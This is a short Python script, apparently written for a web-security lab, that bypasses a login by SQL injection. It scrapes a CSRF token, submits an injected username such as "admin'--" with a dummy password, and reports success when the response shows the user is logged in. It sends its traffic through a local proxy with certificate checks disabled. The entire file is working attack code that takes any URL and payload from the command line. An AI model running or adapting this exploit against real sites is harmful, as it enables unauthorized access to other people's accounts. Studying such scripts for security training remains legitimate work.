import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

# we need a session for this attack
def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)
    data = { "csrf": csrf, 
             "username": payload,
             "password": "randomtext"
            }
    r = s.post(url, data=data, verify=False, proxies=proxies)
    res = r.text

    print(csrf)
    if "Log out" in res:
        return True
    else:
        return False



    # build the post request


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>"% sys.argv[0])
        print('[-] Example: %s www.example.com "admin\'--"'% sys.argv[0])
        sys.exit(-1)

    s = requests.Session()

    if exploit_sqli(s, url, payload):
        print("[+] SQL injection successful!, we have logged in as administrator")
    else:
        print("[-] SQL injection unsuccessful!")